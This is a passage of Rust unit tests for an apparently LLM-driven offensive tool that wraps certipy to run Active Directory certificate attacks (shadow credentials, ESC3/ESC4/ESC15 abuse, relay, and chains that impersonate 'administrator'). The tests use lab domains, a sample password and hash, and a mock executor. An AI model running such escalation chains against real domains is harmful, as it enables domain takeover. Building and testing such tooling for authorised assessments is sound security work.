            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
    }

    // --- certipy_shadow ---

    #[test]
    fn certipy_shadow_missing_target() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn certipy_shadow_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_shadow_empty_hashes_falls_back_to_password() {
        // The LLM has been observed sending `hashes=""` when only a password
        // is available — without the empty-string filter, certipy receives
        // `-hashes ''` and bails with "invalid hash format". The filter at
        // the top of `certipy_shadow` must treat empty hashes as missing so
        // the password branch runs.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "hashes": "",
            "target": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        // Mirror the same filter used in `certipy_shadow` itself.
        let hashes = optional_str(&args, "hashes").filter(|s| !s.is_empty());
        assert!(
            hashes.is_none(),
            "empty hashes should be treated as missing"
        );
        // password fallback must still resolve.
        assert!(required_str(&args, "password").is_ok());
    }

    #[test]
    fn certipy_shadow_present_hashes_used() {
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "hashes": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
            "target": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        let hashes = optional_str(&args, "hashes").filter(|s| !s.is_empty());
        assert!(hashes.is_some());
    }

    // --- certipy_template_esc4 ---

    #[test]
    fn certipy_template_esc4_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_template_esc4_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC4Template",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- certipy_esc3_full_chain (arg-shape) ---

    #[test]
    fn certipy_esc3_full_chain_requires_agent_template() {
        // Without `agent_template` we can't enroll the CRA cert in step 1 —
        // step 2's `-on-behalf-of` would have nothing to sign with.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "agent_template").is_err());
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_template_defaults_to_user() {
        // The on-behalf target template defaults to "User" — the universal
        // client-auth template that any DA can normally enroll. Caller may
        // override for labs that wire ESC3 to a custom CRA template.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10",
            "agent_template": "ESC3"
        });
        let on_behalf_template = optional_str(&args, "on_behalf_template").unwrap_or("User");
        assert_eq!(on_behalf_template, "User");
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_of_defaults_to_administrator() {
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10",
            "agent_template": "ESC3"
        });
        let on_behalf_of = optional_str(&args, "on_behalf_of").unwrap_or("administrator");
        assert_eq!(on_behalf_of, "administrator");
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_target_format() {
        // certipy expects `domain\\principal` (NetBIOS-style, single
        // backslash) for `-on-behalf-of`. Verify the format string compiles
        // to exactly one backslash.
        let domain = "contoso.local";
        let on_behalf_of = "administrator";
        let on_behalf_target = format!("{domain}\\{on_behalf_of}");
        assert_eq!(on_behalf_target, "contoso.local\\administrator");
        assert_eq!(on_behalf_target.matches('\\').count(), 1);
    }

    #[test]
    fn certipy_esc3_full_chain_target_falls_through_aliases() {
        // The CA host can arrive under any of `target`, `ca_host`, or
        // `target_ip` depending on which automation built the args.
        let args = json!({
            "ca_host": "192.168.58.50"
        });
        let target = optional_str(&args, "target")
            .or_else(|| optional_str(&args, "ca_host"))
            .or_else(|| optional_str(&args, "target_ip"));
        assert_eq!(target, Some("192.168.58.50"));

        let args2 = json!({
            "target_ip": "192.168.58.51"
        });
        let target2 = optional_str(&args2, "target")
            .or_else(|| optional_str(&args2, "ca_host"))
            .or_else(|| optional_str(&args2, "target_ip"));
        assert_eq!(target2, Some("192.168.58.51"));
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn certipy_find_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_find_vulnerable_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1", "vulnerable": true
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_upn_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1", "upn": "administrator@contoso.local"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "pfx_path": "/tmp/admin.pfx", "dc_ip": "192.168.58.1",
            "domain": "contoso.local"
        });
        assert!(super::certipy_auth(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_shadow_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "target": "dc01$", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_shadow(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_template_esc4_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_template_esc4(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_relay_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "rpc://192.168.58.10", "ca": "contoso-CA"
        });
        assert!(super::certipy_relay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_application_policies_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC15",
            "dc_ip": "192.168.58.1",
            "application_policies": "1.3.6.1.5.5.7.3.2"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_esc4_full_chain_executes() {
        // 3 execute calls: template, request, auth
        mock::push(mock::success());
        mock::push(mock::success());
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1",
            "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
        });
        assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
    }

    // --- render_chain_output ---

    fn mk_output(stdout: &str, stderr: &str) -> crate::ToolOutput {
        crate::ToolOutput {
            stdout: stdout.into(),
            stderr: stderr.into(),
            exit_code: Some(0),
            success: true,
        }
    }

    #[test]
    fn render_chain_output_concatenates_steps_under_labeled_headers() {
        let a = mk_output("alpha-out", "alpha-err");
        let b = mk_output("bravo-out", "bravo-err");
        let (stdout, stderr) = super::render_chain_output(&[("Alpha", &a), ("Bravo", &b)]);
        assert_eq!(stdout, "=== Alpha ===\nalpha-out\n=== Bravo ===\nbravo-out");
        assert_eq!(stderr, "=== Alpha ===\nalpha-err\n=== Bravo ===\nbravo-err");
    }

    #[test]
    fn render_chain_output_empty_steps_yields_empty_strings() {
        let (stdout, stderr) = super::render_chain_output(&[]);
        assert!(stdout.is_empty());
        assert!(stderr.is_empty());
    }

    #[test]
    fn render_chain_output_single_step_omits_join_separator() {
        let only = mk_output("solo-out", "solo-err");
        let (stdout, stderr) = super::render_chain_output(&[("Only", &only)]);
        assert_eq!(stdout, "=== Only ===\nsolo-out");
        assert_eq!(stderr, "=== Only ===\nsolo-err");
    }

    #[test]
    fn render_chain_output_preserves_step_order() {
        let first = mk_output("1", "");
        let second = mk_output("2", "");
        let third = mk_output("3", "");
        let (stdout, _) = super::render_chain_output(&[
            ("first", &first),
            ("second", &second),
            ("third", &third),
        ]);
        let first_idx = stdout.find("first").unwrap();
        let second_idx = stdout.find("second").unwrap();
        let third_idx = stdout.find("third").unwrap();
        assert!(first_idx < second_idx);
        assert!(second_idx < third_idx);
    }

    #[test]
    fn render_chain_output_handles_empty_stdout_or_stderr_fields() {
        let out_only = mk_output("data", "");
        let err_only = mk_output("", "boom");
        let (stdout, stderr) =
            super::render_chain_output(&[("Out", &out_only), ("Err", &err_only)]);
        assert_eq!(stdout, "=== Out ===\ndata\n=== Err ===\n");
        assert_eq!(stderr, "=== Out ===\n\n=== Err ===\nboom");
    }
}
